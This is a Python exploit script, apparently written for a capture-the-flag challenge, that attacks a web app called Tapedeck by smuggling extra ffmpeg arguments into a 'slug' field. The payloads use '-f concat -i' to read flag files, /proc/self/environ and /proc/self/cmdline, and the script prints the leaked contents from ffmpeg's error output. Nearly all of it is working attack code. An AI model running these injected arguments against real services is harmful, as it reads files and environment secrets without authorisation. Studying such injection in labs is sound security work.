"""Thử chèn argv vào lệnh ffmpeg của Tapedeck để đọc file qua oracle `errors`.

Mọi payload đều là slug: ffmpeg nhận argv = [...cmd.split(' ')] nên token của ta
nằm cuối dòng lệnh, ngay sau output đầu tiên.

Dùng: python analysis/probe3.py <base>
"""
import json
import os
import sys

sys.stdout.reconfigure(encoding="utf-8", errors="replace")

sys.path.insert(0, "analysis")
from probe2 import BASE, JAR, load, render, upload  # noqa: E402

CANDIDATES = [
    "/flag.txt",
    "/flag",
    "/opt/app/flag.txt",
    "/app/flag.txt",
    "./flag.txt",
]

CASES = []
for p in CANDIDATES:
    CASES.append(("concat %s" % p, "a.png -f concat -i %s b.png" % p))

CASES += [
    # đọc biến môi trường của chính tiến trình ffmpeg
    ("concat environ", "a.png -f concat -i /proc/self/environ b.png"),
    ("concat cmdline", "a.png -f concat -i /proc/self/cmdline b.png"),
]


def keep(err, n=1400):
    if not err:
        return None
    err = "".join(c if c >= " " or c == "\n" else "." for c in err)
    lines = [l for l in err.split("\n") if "ffmpeg version" not in l and "--enable" not in l
             and "libav" not in l and "configuration:" not in l]
    return "\n".join(lines)[-n:]


if __name__ == "__main__":
    s, ws = load()
    print("[*] workspace=%s upload=%d" % (ws, upload(s)))
    only = sys.argv[2] if len(sys.argv) > 2 else None
    for tag, slug in CASES:
        if only and only not in tag:
            continue
        d = render(s, slug=slug)
        print("\n===== %s =====" % tag)
        print("slug: %r" % slug)
        print("ok=%s outputs=%s" % (d.get("ok"), d.get("outputs")))
        print("errors:\n%s" % keep(d.get("errors")))
        json.dump(dict(s.cookies), open(JAR, "w"))
